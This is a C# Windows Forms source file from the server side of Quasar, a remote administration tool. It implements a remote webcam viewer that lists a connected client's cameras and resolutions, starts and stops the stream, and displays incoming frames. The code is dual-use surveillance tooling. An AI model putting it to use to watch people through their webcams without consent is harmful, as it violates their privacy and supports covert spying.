using Mono.Cecil.Cil;
using Quasar.Common.Messages;
using Quasar.Common.Video;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;
using Quasar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmRemoteWebcam : Form
    {
        /// <summary>
        /// The client which can be used for the task manager.
        /// </summary>
        private readonly Client _connectClient;
        Dictionary<string, List<Resolution>> _webcams = null;
        public bool IsStarted { get; private set; }

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly RemoteWebcamHandlerS _remoteWebcamHandler;

        public FrmRemoteWebcam(Client client)
        {
            _connectClient = client;
            _remoteWebcamHandler = new RemoteWebcamHandlerS(client);
            RegisterMessageHandler();
            InitializeComponent();
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _remoteWebcamHandler.DisplaysChanged += DisplaysChanged;
            _remoteWebcamHandler.ProgressChanged += UpdateImage;
            MessageHandler.Register(_remoteWebcamHandler);
        }

        /// <summary>
        /// Unregisters the remote desktop message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_remoteWebcamHandler);
            _remoteWebcamHandler.DisplaysChanged -= DisplaysChanged;
            _remoteWebcamHandler.ProgressChanged -= UpdateImage;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void DisplaysChanged(object sender, Dictionary<string, List<Resolution>> webcams)
        {
            cbWebcams.Items.Clear();
           _webcams=webcams;
            foreach (var webcam in webcams.Keys)
            {
                cbWebcams.Items.Add(webcam);
            }
            cbWebcams.SelectedIndex = 0;
        }

        private void UpdateImage(object sender, Bitmap bmp)
        {
            picWebcam.Image = new Bitmap(bmp, picWebcam.Width, picWebcam.Height);
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmRemoteWebcam_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Webcam", _connectClient);
            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);

            btnHide.Left = (panelTop.Width / 2) - (btnHide.Width / 2);

            btnShow.Location = new Point(377, 0);
            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);

            _remoteWebcamHandler.RefreshDisplays();
            _remoteWebcamHandler.LocalResolution = picWebcam.Size;
        }
        // <summary>
        /// Holds the opened Webcam form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmRemoteWebcam> OpenedForms = new Dictionary<Client, FrmRemoteWebcam>();
        public static FrmRemoteWebcam CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmRemoteWebcam f = new FrmRemoteWebcam(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            _connectClient.Send(new DoWebcamStop());
            // all cleanup logic goes here
            if (_remoteWebcamHandler.IsStarted) StopStream();
            UnregisterMessageHandler();
            _remoteWebcamHandler.Dispose();
            picWebcam.Image?.Dispose();
        }

        /// <summary>
        /// Stops the remote Webcam stream.
        /// </summary>
        private void StopStream()
        {
            ToggleConfigurationControls(false);

            picWebcam.Stop();
            // Unsubscribe from the frame counter. It will be re-created when starting again.
            picWebcam.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picWebcam;

            _remoteWebcamHandler.EndReceiveFrames();
        }

        /// <summary>
        /// Updates the title with the current frames per second.
        /// </summary>
        /// <param name="e">The new frames per second.</param>
        private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Webcam", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
        }

        /// <summary>
        /// Toggles the activatability of configuration controls in the status/configuration panel.
        /// </summary>
        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
        private void ToggleConfigurationControls(bool started)
        {
            btnStart.Enabled = !started;
            btnStop.Enabled = started;
            //barQuality.Enabled = !started;
            cbWebcams.Enabled = !started;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbWebcams.Items.Count == 0)
            {
                MessageBox.Show("No webcam detected.\nPlease wait till the client sends a list with available webcams.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            ToggleControls(false);
            this.ActiveControl = picWebcam;
            _connectClient.Send(new GetWebcam
            {
                Webcam = cbWebcams.SelectedIndex,
                Resolution = cbResolutions.SelectedIndex
            });
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            ToggleControls(true);
            this.ActiveControl = picWebcam;
            _connectClient.Send(new DoWebcamStop());
        }

        public void ToggleControls(bool state)
        {
            IsStarted = !state;

            cbWebcams.Enabled = cbResolutions.Enabled = btnStart.Enabled = state;
            btnStop.Enabled = !state;
        }

        private void cbWebcams_SelectedIndexChanged(object sender, EventArgs e)
        {
            cbResolutions.Invoke((MethodInvoker)delegate
            {
                cbResolutions.Items.Clear();
                foreach (var resolution in this._webcams.ElementAt(cbWebcams.SelectedIndex).Value)
                {
                    cbResolutions.Items.Add(resolution.ToString());
                }
                cbResolutions.SelectedIndex = 0;
            });
        }

        private void FrmRemoteWebcam_Resize(object sender, EventArgs e)
        {
            _remoteWebcamHandler.LocalResolution = picWebcam.Size;
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            panelTop.Visible = false;
            btnShow.Visible = true;
            btnHide.Visible = false;
            this.ActiveControl = picWebcam;
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            panelTop.Visible = true;
            btnShow.Visible = false;
            btnHide.Visible = true;
            this.ActiveControl = picWebcam;
        }
    }
}
